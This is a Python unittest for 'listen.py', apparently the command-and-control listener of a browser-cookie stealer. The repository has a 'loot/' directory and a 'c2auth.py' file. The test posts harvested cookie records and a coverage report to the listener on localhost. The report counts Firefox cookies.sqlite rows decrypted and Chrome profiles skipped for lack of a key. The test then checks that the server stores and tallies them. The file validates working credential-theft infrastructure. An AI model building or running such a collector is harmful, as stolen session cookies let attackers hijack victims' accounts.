"""Wire test for listen.py: bare list and the stage-2 coverage envelope.

Runs a real listener on a free port in a throwaway directory, so the repo loot/
is never touched. No mocks, no external deps.
"""
import json
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import unittest
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)


def free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


class TestWire(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.tmp = tempfile.mkdtemp(prefix="ckwire")
        shutil.copy(os.path.join(ROOT, "listen.py"), cls.tmp)
        shutil.copytree(os.path.join(ROOT, "cklog"), os.path.join(cls.tmp, "cklog"))
        for name in ("c2auth.py",):
            src = os.path.join(ROOT, name)
            if os.path.isfile(src):
                shutil.copy(src, cls.tmp)
        cls.port = free_port()
        cls.proc = subprocess.Popen(
            [sys.executable, "listen.py", str(cls.port), "--bind", "127.0.0.1"],
            cwd=cls.tmp, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cls.base = "http://127.0.0.1:%d" % cls.port
        for _ in range(100):
            try:
                urllib.request.urlopen(cls.base + "/health", timeout=1).read()
                return
            except Exception:
                time.sleep(0.05)
        cls.proc.terminate()
        raise RuntimeError("listener did not start")

    @classmethod
    def tearDownClass(cls):
        cls.proc.terminate()
        try:
            cls.proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            cls.proc.kill()
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def post(self, obj):
        req = urllib.request.Request(
            self.base + "/", data=json.dumps(obj).encode("utf-8"),
            headers={"Content-Type": "application/json",
                     "X-CookieLog-Host": "TESTHOST"})
        return urllib.request.urlopen(req, timeout=5).read()

    def get(self, path):
        return json.loads(urllib.request.urlopen(self.base + path, timeout=5).read())

    def test_bare_list_then_envelope(self):
        cookie = {"domain": ".example.com", "name": "sid", "path": "/",
                  "value": "v1", "browser": "firefox", "profile": "p1"}
        self.assertEqual(self.post([cookie]), b"ok")
        health = self.get("/health")
        self.assertEqual(health["records"], 1)
        self.assertFalse(os.path.exists(os.path.join(self.tmp, "loot", "coverage.jsonl")))

        env = {
            "records": [dict(cookie, name="sid2", value="v2")],
            "coverage": {"run": "r1", "sources": [
                {"kind": "firefox", "browser": "firefox", "profile": "p1",
                 "path": "cookies.sqlite", "rows": 10, "decrypted": 9,
                 "failed": 1, "skipped": ""},
                {"kind": "chromium", "browser": "chrome", "profile": "Default",
                 "path": "Cookies", "rows": 0, "skipped": "no-key"},
            ]},
        }
        self.assertEqual(self.post(env), b"ok")
        health = self.get("/health")
        self.assertEqual(health["records"], 2)
        self.assertEqual(health["coverage"], 1)

        rows = self.get("/coverage")
        self.assertEqual(len(rows), 1)
        m = rows[0]
        self.assertEqual(m["host"], "TESTHOST")     # header fills the missing host
        self.assertEqual(m["run"], "r1")
        self.assertEqual(m["totals"]["rows"], 10)
        self.assertEqual(m["totals"]["decrypted"], 9)
        self.assertEqual(m["totals"]["skipped_sources"], 1)


if __name__ == "__main__":
    unittest.main()
